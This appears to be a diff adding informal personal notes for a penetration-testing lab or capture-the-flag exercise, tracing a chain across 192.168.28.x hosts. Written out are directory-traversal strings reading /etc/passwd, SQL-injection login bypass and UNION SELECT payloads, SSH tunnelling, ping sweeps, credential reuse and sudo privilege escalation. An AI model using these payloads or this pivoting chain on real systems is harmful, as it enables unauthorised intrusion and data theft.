@@ -1,0 +1,61 @@
+#Fly
+#Fight
+#Win
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+nmap target 1                                                             22 and 80 are open and there a couple of hidden pages
+firefox and navigate to the web server on 80
+navigate to every page on the website
+
+--------------------------------------------------------------------------
+"File to read:" means you can probably directory traverse:
+../../../../../../../../../etc/passwd
+../../../../../../../../../etc/hosts
+
+root exists
+www-data exists and has home dir /var/www
+
+192.168.28.181 WebApp          <- straight out of /etc/hosts
+--------------------------------------------------------------------------
+Upload means you may be able to malicious file upload
+--------------------------------------------------------------------------
+Username: ' or 1='1
+Password: ' or 1='1
+Good creds on a website -> Welcome Aaron
+If it allows these creds at all then send those creds while f12->network->POST->Request->raw-> copy+paste the line and put it in the url after username= and password=
+----------------------------------------------------------------------------------------------------------------------------------------------------
+ssh into web server (but on ssh) with the creds found
+basic host enumeration
+nmap found host (.181)
+ssh tunnel to the found hosts (.181) on both ssh and http
+go to the website on the .181
+----------------------------------------------------------------------------------------------------------------------------------------------------
+The website allows you to select a product
+select 1 and the url should say product=x
+go through every number that x can be and add OR 1=1 #                                                      *DONT ADD QUOTES HERE*
+Holy shit one of them pulled up the entire table
+UNION SELECT 1,2,3                    <-Figure out how many inputs you can get
+UNION SELECT table_schema,column_name,table_name from information_schema.columns #                           <- Now golden statement that whore (Maybe reorganize the golden statement based off the order that 123 popped up in)
+In theory you should see the database , take some notes on what goes where
+UNION SELECT user_id,name,username from siteusers.users #                                                    Continue querying the database till you find needed info
+--------------------------------------------------------------------------------------------------------------------------
+If you dont know the next target then ping sweep whatever network you've got (192.168.28.1..254)
+oh god you found a new device (.172)
+nmap that hoe
+it has ssh
+try to ssh with creds found in the database from the last block
+Oh my god we're in
+----------------------------------------------------------------------------------------------------------------------------------------------------
+Basic host enumeration
+sudo -l
+oh my god escalate that hoe, refer to gtfobins
+ping sweep the network 192.168.28.1..254
+oh my god theres a new one (.179)
+----------------------------------------------------------------------------------------------------------------------------------------------------
+nmap the .179
+holy fucking shit it has ssh, rdp, and secure-server is running on 9999
+You could buffer overflow on this bitch to abuse the secure-server
+OR MUCH SMARTERLY
+just rdp with the creds you got from that database.
+Holy shit you're in
+----------------------------------------------------------------------------------------------------------------------------------------------------
+gg
